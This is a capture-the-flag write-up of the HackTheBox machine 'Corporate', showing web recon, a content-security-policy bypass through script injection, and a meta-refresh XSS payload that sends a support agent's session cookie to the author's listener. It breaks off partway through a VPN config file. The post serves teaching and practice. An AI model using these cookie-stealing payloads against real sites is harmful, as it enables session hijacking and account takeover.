---
title: HTB: Corporate
url: https://0xdf.gitlab.io/2024/07/13/htb-corporate.html
date: 2024-07-13T13:45:00+00:00
difficulty: Insane [50]
os: Linux
tags: htb-corporate, hackthebox, ctf, nmap, ffuf, subdomain, sso, csp, content-security-policy, csp-evaluator, feroxbuster, html-injection, xss, meta-redirect, jwt, python-jwt, openvpn, vpn, idor, burp, burp-repeater, brute-force, default-creds, debian, ubuntu, netexec, docker, docker-sock, sssd, linux-ldap, autofs, nfs, firefox, firefox-history, bitwarden, firefox-bitwarden, bitwarden-pin-brute-force, snappy, rust, cargo, moz-idb-edit, jq, gitea, jwt-forge, docker-image-upload, proxmox, pve
---

![Corporate](/img/corporate-cover.png)

Corporate is an epic box, with a lot of really neat technologies along the way. I’ll start with a very complicated XSS attack that must utilize two HTML injections and an injection into dynamic JavaScript to bypass a content security policy and steal a a cookie. With that cookie, I’ll enumerate users and abuse an insecure direct object reference vulnerability to get access to a welcome PDF that contains a default password syntax that includes the user’s birthday. I’ll brute force through the user’s profiles, collecting their email and birthday, and checking for any users that still use the default password. Each user also has an OpenVPN connection config. I’ll connect and find a remote VM that I can SSH into as these users. On that host, I’ll find a dynamic home directory system that mounts NFS shares on login as different users. I’ll find a Bitwarden Firefox extension in one user’s home directory, and extract that to get their time-based one time password to the local Gitea instance. This instance has the source to the websites, and I’ll find the JWT secret in an old commit, which allows me to generate tokens as any user and reset passwords without knowing the old one. I’ll use that to get access to the VM as an user with access to the Docker socket, and escalate to root on that VM. I’ll target sysadmin users and find an SSH key that works to get onto the main host. From there, I’ll abuse a Proxmox backup to generate a cookie and use the API to reset the root user’s password.

## Box Info

| Name | [Corporate](https://hackthebox.com/machines/corporate)  [Corporate](https://hackthebox.com/machines/corporate) [Play on HackTheBox](https://hackthebox.com/machines/corporate) |
| --- | --- |
| Release Date | [16 Dec 2023](https://twitter.com/hackthebox_eu/status/1735291078041805016) |
| Retire Date | 13 Jul 2024 |
| OS | Linux Linux |
| Base Points | Insane [50] |
| Rated Difficulty | Rated difficulty for Corporate |
| Radar Graph | Radar chart for Corporate |
| First Blood User | 1 day02:12:38[m4cz m4cz](https://app.hackthebox.com/users/275298) |
| First Blood Root | 1 day04:05:57[Blindhero Blindhero](https://app.hackthebox.com/users/201283) |
| Creator | [JoshSH JoshSH](https://app.hackthebox.com/users/269501) |

## Recon

### nmap

`nmap` finds a single open TCP port, HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.246
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-08 14:18 EDT
Nmap scan report for 10.10.11.246
Host is up (0.085s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.51 seconds
oxdf@hacky$ nmap -p 80 -sCV 10.10.11.246
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-08 14:18 EDT
Nmap scan report for 10.10.11.246
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    OpenResty web app server 1.21.4.3
|_http-server-header: openresty/1.21.4.3
|_http-title: Did not follow redirect to http://corporate.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds

```

The HTTP server is OpenResty, and there’s a redirect to `corporate.htb`.

### Subdomain Fuzz

Before checking out the webserver, I’ll fuzz it with `ffuf` to look for subdomains of `corporate.htb` that respond differently from the default case:

```

oxdf@hacky$ ffuf -u http://10.10.11.246 -H "Host: FUZZ.corporate.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.246
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.corporate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

support                 [Status: 200, Size: 1725, Words: 383, Lines: 39, Duration: 129ms]
git                     [Status: 403, Size: 159, Words: 3, Lines: 8, Duration: 85ms]
sso                     [Status: 302, Size: 38, Words: 4, Lines: 1, Duration: 100ms]
people                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 102ms]
:: Progress: [19966/19966] :: Job [1/1] :: 466 req/sec :: Duration: [0:00:43] :: Errors: 0 ::

```

I’ll add all four plus the base domain to my `/etc/hosts` file:

```
10.10.11.246 corporate.htb support.corporate.htb git.corporate.htb sso.corporate.htb people.corporate.htb

```

### corporate.htb - TCP 80

#### Site

The site is for an SEO agency:

![image-20240708142712491](/img/image-20240708142712491.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

At the top and bottom of the page is an email address, `hello@corporate.htb`, as well as a form to get chat support:

![image-20240708142839944](/img/image-20240708142839944.png)

This leads to `support.corporate.htb`.

#### Tech Stack

The main site loads as `/index.html`, suggesting this is a static site. The 404 page is custom to this template:

![image-20240709103829016](/img/image-20240709103829016.png)

It is worth noting that the 404 page does display the URL given, which will prove valuable later.

#### CSP

The HTTP response headers don’t include a `Server` header:

```

HTTP/1.1 200 OK
Date: Mon, 08 Jul 2024 18:26:12 GMT
Content-Type: text/html
Connection: close
Content-Security-Policy: base-uri 'self'; default-src 'self' http://corporate.htb http://*.corporate.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://maps.googleapis.com https://maps.gstatic.com; font-src 'self' https://fonts.googleapis.com/ https://fonts.gstatic.com data:; img-src 'self' data: maps.gstatic.com; frame-src https://www.google.com/maps/; object-src 'none'
X-Content-Type-Options: nosniff
X-XSS-Options: 1; mode=block
X-Frame-Options: DENY
Content-Length: 16856

```

There is a content security policy (CSP), which defines what kinds of JavaScript will run inside this page.

Google makes a nice [CSP Evaluator](https://csp-evaluator.withgoogle.com/) that will make it easier to look at and show any potential vulnerabilities:

[![image-20240708143811996](/img/image-20240708143811996.png)*Click for full size image*](/img/image-20240708143811996.png)

It shows the different domains that scripts, CSS, fonts, images, and iframes can be loaded from. In this case, the warnings don’t seem significant here.

I’ll keep this in mind if I find something like a cross site scripting (XSS) vulnerability.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x html` since I know the site is hosting HTML pages:

```

oxdf@hacky$ feroxbuster -x html -u http://corporate.htb
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://corporate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      163l      366w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      409l     1051w    16856c http://corporate.htb/
301      GET        7l       11w      175c http://corporate.htb/assets => http://corporate.htb/assets/
301      GET        7l       11w      175c http://corporate.htb/assets/js => http://corporate.htb/assets/js/
301      GET        7l       11w      175c http://corporate.htb/assets/images => http://corporate.htb/assets/images/
301      GET        7l       11w      175c http://corporate.htb/assets/css => http://corporate.htb/assets/css/
200      GET      409l     1051w    16856c http://corporate.htb/index.html
204      GET        0l        0w        0c http://corporate.htb/analytics
204      GET        0l        0w        0c http://corporate.htb/analytics.html
301      GET        7l       11w      175c http://corporate.htb/vendor => http://corporate.htb/vendor/
301      GET        7l       11w      175c http://corporate.htb/vendor/jquery => http://corporate.htb/vendor/jquery/
[####################] - 4m    210000/210000  0s      found:10      errors:0
[####################] - 4m     30000/30000   138/s   http://corporate.htb/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/assets/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/assets/images/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/assets/css/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/assets/js/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/vendor/ 
[####################] - 4m     30000/30000   139/s   http://corporate.htb/vendor/jquery/   

```

#### analytics

`analytics.html` is interesting, but returning 204 (no content).

Interestingly, looking back at the Burp history when the main page is loaded, it includes POST requests to both `/analytics/page` and `/analytics/init`:

![image-20240709104239175](/img/image-20240709104239175.png)

Both of these return 204 No Content. The POST requests to them each include that variable as the `userId`. For example, the second one:

```

POST /analytics/init HTTP/1.1
Host: corporate.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://corporate.htb/
Content-Type: text/plain;charset=UTF-8
Content-Length: 214
Origin: http://corporate.htb
Connection: close
Priority: u=4
Pragma: no-cache
Cache-Control: no-cache

{"type":"identify","userId":"8842473198714","traits":{},"options":{},"anonymousId":"87a776ea-8821-4d5d-9b14-c14de087e2d9","meta":{"rid":"cd84a1c8-fe0c-4615-a5b4-6737eb56dec8","ts":1720536053755,"hasCallback":true}}

```

### people.corporate.htb - TCP 80

#### Site

Visiting `/` redirects to `/dashboard` which then redirects to `/auth/login`, where it offers a link to login:

![image-20240708144318611](/img/image-20240708144318611.png)

This link leads to `http://sso.corporate.htb/?redirect=http%3A%2F%2Fpeople%2Ecorporate%2Ehtb`. Presumably once logging into SSO, I’ll have a cookie that allows access to `/` (or some other authed page).

#### Directory Brute Force

I’ll run `feroxbuster` against this subdomain as well. Interestingly, it starts to show duplicates across casing:

[![image-20240708145255464](/img/image-20240708145255464.png)*Click for full size image*](/img/image-20240708145255464.png)

I’ve highlighted the different groups of the same word in different casing. That’s common for Windows servers, but not as much on Linux servers. I’ll kill this run and start again with a lowercase wordlist (because `feroxbuster` recurses it will take forever to finish otherwise):

```

oxdf@hacky$ feroxbuster -u http://people.corporate.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://people.corporate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       36l       62w      805c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       32c http://people.corporate.htb/ => http://people.corporate.htb/dashboard
302      GET        1l        4w       33c http://people.corporate.htb/news => http://people.corporate.htb/auth/login
301      GET       10l       16w      179c http://people.corporate.htb/static => http://people.corporate.htb/static/
302      GET        1l        4w       33c http://people.corporate.htb/chat => http://people.corporate.htb/auth/login
302      GET        1l        4w       33c http://people.corporate.htb/calendar => http://people.corporate.htb/auth/login
301      GET       10l       16w      185c http://people.corporate.htb/static/js => http://people.corporate.htb/static/js/
301      GET       10l       16w      187c http://people.corporate.htb/static/img => http://people.corporate.htb/static/img/
301      GET       10l       16w      187c http://people.corporate.htb/static/css => http://people.corporate.htb/static/css/
302      GET        1l        4w       33c http://people.corporate.htb/dashboard => http://people.corporate.htb/auth/login
302      GET        1l        4w       33c http://people.corporate.htb/employee => http://people.corporate.htb/auth/login
302      GET        1l        4w       33c http://people.corporate.htb/holidays => http://people.corporate.htb/auth/login
302      GET        1l        4w       33c http://people.corporate.htb/payroll => http://people.corporate.htb/auth/login
302      GET        1l        4w       33c http://people.corporate.htb/sharing => http://people.corporate.htb/auth/login
[####################] - 9m    132920/132920  0s      found:13      errors:0
[####################] - 8m     26584/26584   58/s    http://people.corporate.htb/ 
[####################] - 8m     26584/26584   52/s    http://people.corporate.htb/static/ 
[####################] - 8m     26584/26584   52/s    http://people.corporate.htb/static/js/ 
[####################] - 8m     26584/26584   52/s    http://people.corporate.htb/static/img/ 
[####################] - 8m     26584/26584   52/s    http://people.corporate.htb/static/css/ 

```

Everything interesting seems to be behind the login.

### sso.corporate.htb - TCP 80

#### Site

Visiting `/` redirects to `/login?redirect=`. It makes sense that this login form would want to know where to send the user on success, and since I visited directly, the `redirect` parameter is empty. This site offers a login form:

![image-20240708144531424](/img/image-20240708144531424.png)

This form requires username and password, and basic SQL injections attempts don’t bypass it. I’ll come back with creds or some other auth.

#### Directory Brute Force

Starting with the default wordlist shows that this site is also case-insensitive, so I’ll kill and run again with a lowercase wordlist:

```

oxdf@hacky$ feroxbuster -u http:/sso.corporate.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http:/sso.corporate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       10l       15w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        1l        4w       38c http://sso.corporate.htb/ => http://sso.corporate.htb/login?redirect=
302      GET        1l        4w       28c http://sso.corporate.htb/logout => http://sso.corporate.htb/login
200      GET       37l       77w     1010c http://sso.corporate.htb/login
301      GET       10l       16w      179c http://sso.corporate.htb/static => http://sso.corporate.htb/static/
200      GET       61l      126w     1444c http://sso.corporate.htb/services
301      GET       10l       16w      187c http://sso.corporate.htb/static/css => http://sso.corporate.htb/static/css/
301      GET       10l       16w      187c http://sso.corporate.htb/static/img => http://sso.corporate.htb/static/img/
302      GET        1l        4w       49c http://sso.corporate.htb/reset-password => http://sso.corporate.htb/login?redirect=%2fservices
[####################] - 3m    106336/106336  0s      found:8       errors:0      
[####################] - 2m     26584/26584   183/s   http:/sso.corporate.htb/ 
[####################] - 3m     26584/26584   159/s   http://sso.corporate.htb/static/ 
[####################] - 3m     26584/26584   159/s   http://sso.corporate.htb/static/css/ 
[####################] - 3m     26584/26584   159/s   http://sso.corporate.htb/static/img/ 

```

The only interesting thing is `/services`, which returns 200. The page has two blocks and a logout link:

![image-20240708170819924](/img/image-20240708170819924.png)

It sort of implies that I should be logged in to access this page. “Our People” links to `people.corporate.htb`. “Password Resets” links to `http://sso.corporate.htb/reset-password`, but (as `feroxbuster` showed above) that just redirects to the SSO login page.

### git.corporate.htb - TCP 80

Visiting this site returns a 403 Forbidden page:

![image-20240708171502005](/img/image-20240708171502005.png)

Here the OpenResty server and version is shown.

### support.corporate.htb - TCP 80

#### Site

The root site returns a couple paragraphs about the support team and asks for a name:

![image-20240708171130399](/img/image-20240708171130399.png)

Entering a name takes me to a page with a chat agent:

![image-20240708171154308](/img/image-20240708171154308.png)

This is the same place that the form on the main site [above](#site) leads. The URL includes a ticket GUID, `http://support.corporate.htb/ticket/e842eb89-bd1a-4a9c-ada9-86ae89e76d90`.

The agent is very eager to chat and will close the ticket if I don’t respond quickly enough:

![image-20240708171231815](/img/image-20240708171231815.png)

If I do send message, the replies are the same:

![image-20240708171350987](/img/image-20240708171350987.png)

Directory brute force on this subdomain doesn’t find anything interesting.

#### Tech Stack

I’ll note that on creating a new ticket / chat, it starts with a POST request (1), which 302 redirects to a GET for the new ticket ID (2), followed by the [SocketIO](https://socket.io/) Javascript (3) and then a websocket connection (4):

![image-20240708173813135](/img/image-20240708173813135.png)

The HTTP 101 Switching Protocols response is indicitive of websockets. There are messages in the “WebSockets history” tab in Burp:

![image-20240708174017940](/img/image-20240708174017940.png)

These messages contain not only text, but an `isTyping` status.

## SSO Auth

### support.corporate.htb Injection

#### HTML Injection POC

Especially given the use of CSP, it’s worth starting very basic at the chat and looking for HTML injection. Can I put HTML into the chat and have it evaluated as such. I’ll start with a simple test:

```

Hello! <b>bold text</b>, plain text, <i>italics text</i>, and <img src="http://corporate.htb/assets/images/services-02.jpg" />

```

The bold and italics work, but the image does not:

![image-20240709103030391](/img/image-20240709103030391.png)

Even though I tried an image on Corporate, it is blocked because the CSP says images can only come from `self`, which is `support.corporate.htb` in this case:

![image-20240709103143289](/img/image-20240709103143289.png)

I could try to load an image from `support.corporate.htb` to test, but I don’t see any, and doing so won’t add much anyway.

#### onerror Attempt

Given that the image is failing to load, I can try giving it an `onerror` script to run:

```

<img src="x" onerror="console.log('this is a test')">

```

In the console, just another error message:

![image-20240709103523786](/img/image-20240709103523786.png)

Inline scripts must be [explicitly allow-listed in the CSP](https://content-security-policy.com/examples/allow-inline-script/), unless `unsafe-inline` is used (which really just breaks the point of having the CSP).

### corporate.htb Injection

I noted [above](#tech-stack) that the URL was displayed back in the 404 page. I’ll try HTML injection there, and it works as well:

![image-20240709105356123](/img/image-20240709105356123.png)

I’ll try adding `<script>console.log("test");</script>` to the URL, and it loads, but the script is blocked by CSP:

![image-20240709105543698](/img/image-20240709105543698.png)

### Script Injection

#### Analytics Scripts Analysis

I noted [during enumeration](#analytics) that there was analytics scripts that were sending back data. It also seems that a variable (`v`) is being used to generate these JavaScript payloads:

![image-20240709111447480](/img/image-20240709111447480.png)

This seems to be coded into the initial `index.html` page, and changed on each refresh of the page, suggesting that `index.html` is actually dynamically generated as well.

In the dev tools, I’ll take a look at these source files:

![image-20240709111652834](/img/image-20240709111652834.png)

Some quick checks with Ctrl-f show only `analytics.min.js` has that ID included in it:

![image-20240709111916804](/img/image-20240709111916804.png)

The code is minified and obfuscated down to one line, but the Firefox dev tools do a pretty nice job of at least pretty printing it. The others script files seem to be public scripts from JQuery or other frameworks, where as this one looks to be custom to Corporate.

There are some methods that call `fetch`, which are likely responsible for the HTTP requests:

![image-20240709112538248](/img/image-20240709112538248.png)

It is possible and even a bit fun to go down the rabbit hole of reversing this JavaScript, but not necessary to solve Corporate.

#### Control Over JS Generation

If I control the URL and thus the `v` value, can I inject JavaScript into this script that will be executed? The first check is to verify that I can control the JS:

![image-20240709124012092](/img/image-20240709124012092.png)

It works.

#### Injection

To check if I can inject JavaScript, I’ll use Burp and set it to intercept responses and refresh the main page. When Burp catches the response, I’ll find where the scripts are loaded in the HTML and change the `v` value to some JavaScript:

![image-20240709124917769](/img/image-20240709124917769.png)

I’ll forward that request, and then turn intercept off so the rest of the page can load. There’s a popup:

![image-20240709124945046](/img/image-20240709124945046.png)

The injected script loaded.

#### Via 404 Page

I’ve shown I can get the `analytics.min.js` script to run arbitrary JS. The 404 page will load a script block, but only one sourced to `corporate.htb`. So I’ll use the 404 page to make a link that loads it.

I’ll try to load this:

```

http://corporate.htb/<script src="http://corporate.htb/assets/js/analytics.min.js?v=alert(1)"></script>

```

On loading, I don’t get an alert. Looking at the console, the errors explain what’s happening:

![image-20240709133227193](/img/image-20240709133227193.png)

The first error is the 404 on the page as expected. The next is in the `analytics.min.js`, where `_analytics` is not defined on line one (though the entire file is minified to one line, so that’s not helpful).

If I try the console after loading, that variable is there:

![image-20240709133457131](/img/image-20240709133457131.png)

I’ve injected the load of `analytics.min.js` before all the normal JS loads, and something from another file is needed. Looking at the page source, the `/vendor/analytics.min.js` is loaded just before the `/assets/js/analytics.min.js` file:

![image-20240709133630253](/img/image-20240709133630253.png)

If I look at that file, the first thing it does is define `_analytics`:

![image-20240709133733482](/img/image-20240709133733482.png)

I’ll solve this issue by including this file before the exploited one:

```

http://corporate.htb/<script src="http://corporate.htb/vendor/analytics.min.js?v=8445762879404"></script><script src="http://corporate.htb/assets/js/analytics.min.js?v=alert(1)"></script>

```

When I load this, there’s the alert:

![image-20240709133920921](/img/image-20240709133920921.png)

Now I have a URL I can send that will run JavaScript.

#### Remote Fetch

To improve this to the point I can use it, I’ll start by simply having it redirect to my server. It takes a bit of playing with quotes to get this to work, but I’ll find this payload:

```

http://corporate.htb/<script src="http://corporate.htb/vendor/analytics.min.js?v=8445762879404"></script><script src="http://corporate.htb/assets/js/analytics.min.js?v=window.location=`http://10.10.14.6/pwned`"></script>

```

On visiting, I’m redirected to my host:

![image-20240709134456392](/img/image-20240709134456392.png)

At my Python webserver:

```
10.10.14.6 - - [09/Jul/2024 13:45:04] code 404, message File not found
10.10.14.6 - - [09/Jul/2024 13:45:04] "GET /pwned HTTP/1.1" 404 -
10.10.14.6 - - [09/Jul/2024 13:45:04] code 404, message File not found
10.10.14.6 - - [09/Jul/2024 13:45:04] "GET /favicon.ico HTTP/1.1" 404 -

```

### Exploit Support Agent

#### Phishing Fails

I can try just sending this URL to the support chat. Just pasting in the URL un-encoded, the `script` tags are evaluated and nothing happens:

![image-20240709134833250](/img/image-20240709134833250.png)

A URL-encoded version will paste in:

![image-20240709135316854](/img/image-20240709135316854.png)

But despite chatting, there’s no indication of any activity at my webserver.

I can also try an anchor tag to make it a link for the agent like this:

```

<a href="http://corporate.htb/%3Cscript%20src=%22http://corporate.htb/vendor/analytics.min.js?v=8445762879404%22%3E%3C/script%3E%3Cscript%20src=%22http://corporate.htb/assets/js/analytics.min.js?v=window.location=`http://10.10.14.6/pwned`%22%3E%3C/script%3E">Look at this</a>

```

It shows up like a link:

![image-20240709135402922](/img/image-20240709135402922.png)

And when I click it, I end up at `http://10.10.14.6/pwned`. But there’s no clicks from the agent.

#### meta Redirect

This [Medium post from NorthStar](https://northstar1.medium.com/easy-ways-to-exploit-html-injection-d06a594b9577) talks about ways to exploit HTML injection. The first suggestion is using a `meta` tag to redirect a browser to another page:

```

<meta name="language" content="0;<URL>"HTTP-EQUIV="refresh""/>

```

I’ll try that here:

```

<meta name="language" content="0;http://corporate.htb/%3Cscript%20src=%22http://corporate.htb/vendor/analytics.min.js?v=8445762879404%22%3E%3C/script%3E%3Cscript%20src=%22http://corporate.htb/assets/js/analytics.min.js?v=window.location=`http://10.10.14.6/pwned`%22%3E%3C/script%3E"HTTP-EQUIV="refresh""/>

```

When I paste that in and submit, I’m immediately redirected to my VM. Looking at the Python webserver, the support agent visited as well (in fact before my browser did!):

```
10.10.11.246 - - [09/Jul/2024 13:57:19] code 404, message File not found
10.10.11.246 - - [09/Jul/2024 13:57:19] "GET /pwned HTTP/1.1" 404 -
10.10.14.6 - - [09/Jul/2024 13:57:19] code 404, message File not found
10.10.14.6 - - [09/Jul/2024 13:57:19] "GET /pwned HTTP/1.1" 404 -
10.10.14.6 - - [09/Jul/2024 13:57:20] code 404, message File not found
10.10.14.6 - - [09/Jul/2024 13:57:20] "GET /favicon.ico HTTP/1.1" 404 -

```

#### Cookie Theft

Before I go for more complicated ways to try to load JavaScript, I’ll see if I can grab the agent’s cookie. I haven’t managed to log in, so I don’t know what the name is or if it is set `HttpOnly` (which would prevent this kind of theft), but it’s a quick check. I’ll update the redirect to include `document.cookie`:

```

<meta name="language" content="0;http://corporate.htb/%3Cscript%20src=%22http://corporate.htb/vendor/analytics.min.js?v=8445762879404%22%3E%3C/script%3E%3Cscript%20src=%22http://corporate.htb/assets/js/analytics.min.js?v=window.location=`http://10.10.14.6/pwned?c=`%2bdocument.cookie%22%3E%3C/script%3E"HTTP-EQUIV="refresh""/>

```

On sending, I get the agent’s cookie:

```
10.10.11.246 - - [09/Jul/2024 14:03:52] "GET /pwned?c=CorporateSSO=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NSwibmFtZSI6Ik1hcmdhcmV0dGUiLCJzdXJuYW1lIjoiQmF1bWJhY2giLCJlbWFpbCI6Ik1hcmdhcmV0dGUuQmF1bWJhY2hAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMDU0ODIwNywiZXhwIjoxNzIwNjM0NjA3fQ.0GnWEY70useTfDbXuFT0HsshbnAf4DaJEJ-20utrkyw HTTP/1.1" 404 -

```

#### Cookie

The cookie looks like a JWT, which is worth decoding:

```

>>> jwt.decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3NSwibmFtZSI6Ik1hcmdhcmV0dGUiLCJzdXJuYW1lIjoiQmF1bWJhY2giLCJlbWFpbCI6Ik1hcmdhcmV0dGUuQmF1bWJhY2hAY29ycG9yYXRlLmh0YiIsInJvbGVzIjpbInNhbGVzIl0sInJlcXVpcmVDdXJyZW50UGFzc3dvcmQiOnRydWUsImlhdCI6MTcyMDU0ODIwNywiZXhwIjoxNzIwNjM0NjA3fQ.0GnWEY70useTfDbXuFT0HsshbnAf4DaJEJ-20utrkyw', options={"verify_signature": False})
{'id': 5075, 'name': 'Margarette', 'surname': 'Baumbach', 'email': 'Margarette.Baumbach@corporate.htb', 'roles': ['sales'], 'requireCurrentPassword': True, 'iat': 1720548207, 'exp': 1720634607}

```

`Margarette.Baumbach@corporate.htb` is the user, in sales. There’s also a `requireCurrentPassword` value, which seems like it could be related to password resets.

It’s interesting that there are many agents. If I try again with a different agent, I can get a cookie for another user, for example, Candido Hackett:

```

>>> jwt.decode('eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NTA3MiwibmFtZSI6IkNhbmRpZG8iLCJzdXJuYW1lIjoiSGFja2V0dCIsImVtYWlsIjoiQ2FuZGlkby5IYWNrZXR0QGNvcnBvcmF0ZS5odGIiLCJyb2xlcyI6WyJzYWxlcyJdLCJyZXF1aXJlQ3VycmVudFBhc3N3b3JkIjp0cnVlLCJpYXQiOjE3MjA1NDk1ODcsImV4cCI6MTcyMDYzNTk4N30.HkhMdZieL8hHm1ob2VqDHsAVxMHEFyEvNJcBEEujxLc', options={"verify_signature": False})
{'id': 5072, 'name': 'Candido', 'surname': 'Hackett', 'email': 'Candido.Hackett@corporate.htb', 'roles': ['sales'], 'requireCurrentPassword': True, 'iat': 1720549587, 'exp': 1720635987}

```

If I add the cookie to my browser for `support.corporate.htb`, it doesn’t seem any different. I’ll add the same cookie for `sso.corporate.htb`, and then on loading the page, instead of being redirected to the login form, the browser loads `/services`:

![image-20240709141042985](/img/image-20240709141042985.png)

The “Password Resets” link goes to the form, but asks for the current password to do it:

![image-20240709141206671](/img/image-20240709141206671.png)

(I wonder if that has to do with the `requireCurrentPassword` value of True in the JWT.)

The “Our People” link works (though I need to add the cookie to `people.corporate.htb` as well):

![image-20240709141307331](/img/image-20240709141307331.png)

## Shell as elwin.jones on corporate-workstation

### Website Enumeration

There are several applications in this web dashboard.

#### Chat

The chat page (`/chat)` is quite active:

![image-20240709143936643](/img/image-20240709143936643.png)

It is not vulnerable to HTML injection:

![image-20240709144023895](/img/image-20240709144023895.png)

#### Profile

I can click on a user name and get their profile (`/employee/<id>`):

![image-20240709144123765](/img/image-20240709144123765.png)

This includes their role, email, and birthday. Clicking on my own link at the top right goes to `/employee`, with the profile for the currently logged in user (and no additional information).

#### News

The news page (`/news`) has a list of articles:

![image-20240709144249035](/img/image-20240709144249035.png)

There’s nothing of interest here.

#### Sharing

The sharing page (`/sharing`) has a form to upload files as well as a list of files the logged in user has access to:

![image-20240709144456521](/img/image-20240709144456521.png)

The `.ovpn` file is particularly interesting, as it potentially allows me to connect to a VPN:

```

oxdf@hacky$ cat margarette-baumbach.ovpn
client
proto udp
explicit-exit-notify
remote corporate.htb 1194
dev tun
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
verify-x509-name server_xIsQbY7vcIxWACne name
auth SHA256
auth-nocache
cipher AES-128-GCM
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIB1zCCAX2gAwIBAgIUYGT5V4trycd8E0PrkjNI0ZQpSKkwCgYIKoZIzj0EAwIw
HjEcMBoGA1UEAwwTY25feDhKRmtFSnRBTGE4RGVzQzAeFw0yMzA0MDgxNDQyNTZa
Fw0zMzA0MDUxNDQyNTZaMB4xHDAaBgNVBAMME2NuX3g4SkZrRUp0QUxhOERlc0Mw
